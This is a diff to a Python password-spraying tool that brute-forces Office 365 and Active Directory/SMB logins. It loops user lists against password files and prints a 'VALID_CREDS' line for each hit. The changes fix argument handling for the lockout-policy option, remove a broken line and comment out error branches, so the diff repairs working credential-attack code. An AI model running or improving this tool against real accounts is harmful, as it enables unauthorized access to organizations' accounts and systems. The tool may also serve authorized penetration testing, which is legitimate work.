@@ -149,9 +149,10 @@ def check_o365(username):
 def hybrid_office_worker(policy, user, _pass):
     
     attempts = 1
-    max_attempts, timelimit = tuple(policy.split(','))
-    timelimit = int(timelimit)
-    max_attempts = int(max_attempts)
+    if policy:
+        max_attempts, timelimit = tuple(policy.split(','))
+        timelimit = int(timelimit)
+        max_attempts = int(max_attempts)
 
     if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
         # this shows we are spraying a single username against a passfile
@@ -227,8 +228,6 @@ def sprayAD(host,username,password,client,computerName,domain_name=""):
         print("["+Fore.GREEN+"VALID_CREDS","] {}:{} using {}:{}".format(IP,port,username,password))
     else:
         print("["+Fore.RED+"INVALID_CREDENTIALS","] {}:{} using {}:{}".format(IP,port,username,password))
-    finally:
-        conn.close()
     
 
 def hybrid_smb_worker(host, policy, user, _pass, client, computerName="", domain=""):
@@ -270,7 +269,6 @@ def hybrid_smb_worker(host, policy, user, _pass, client, computerName="", domain
     elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
         # this means we are spraying userfile against passfile.
         try:
-            passfile = 
             for password in _pass.readlines():
                 for username in user.readlines():
                     sprayAD(host, username.strip("\n"), password.strip("\n"), client, computerName, domain_name=domain)
@@ -340,9 +338,10 @@ if __name__ == '__main__':
             brute_office(username, password,check_user)
         else:
             if not policy:
+                policy = ""
                 if userfile and password:
                     userfile = open(userfile, 'r')
-                    hybrid_office_worker(policy="", userfile, password)
+                    hybrid_office_worker(policy, userfile, password)
                 else:
                     ArgumentParser().print_help()
                     sys.exit(0)
@@ -353,10 +352,12 @@ if __name__ == '__main__':
                 passfile = open(passfile, 'r')
                 userfile = open(userfile, 'r')
                 hybrid_office_worker(policy, userfile, passfile)
+            '''
             else:
-                print(Fore.RED+"[+]Unknown error! Check usage")
+                print(Fore.RED+"[+]Unknown error! Check usage here:")
                 ArgumentParser().print_help()
                 sys.exit(0)
+            '''
 
     # Run smb spraying test
     if mode == "smb":
@@ -386,8 +387,10 @@ if __name__ == '__main__':
                 passfile = open(passfile, 'r')
                 userfile = open(userfile, 'r')
                 hybrid_smb_worker(host, policy, userfile, passfile, client, servername, domain=domain)
+            '''
             else:
                 print(Fore.RED+"[+]Unknown error! Check usage")
                 ArgumentParser().print_help()
                 sys.exit(0)
+            '''
     print(Fore.GREEN+"[*] All Jobs Done! Nothing to Spray/Bruteforce")  
